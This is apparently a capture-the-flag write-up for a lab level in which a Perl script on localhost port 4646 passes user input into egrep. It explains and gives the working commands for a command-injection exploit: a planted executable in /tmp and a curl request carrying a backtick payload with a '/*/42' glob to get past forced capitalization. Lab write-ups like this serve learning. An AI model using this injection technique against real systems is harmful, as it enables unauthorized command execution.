## This repository contains a server-side perl script.
## This script is running on localhost on port 4646. It expects a client to connect and send two parameters x and y.
## It then capitalizes x and removes everything after the first whitespace. the result is executed by egrep 
## We have user privileges on this script.

# We create a file /tmp/42 with executable permissions that contains

getflag > /tmp/result

# We provide the link to this file so it is executed by egrep.
# The obstacle here is that the path will be capitalized, this is why we replace tmp by  `*`.
# The file will be searched in all the repositoris until it is found and executed.
# We escape the backticks so that the execution doesnt take place in our shell but in flag12's.

chmod +x /tmp/42
curl localhost:4646?x=\`/*/42`\
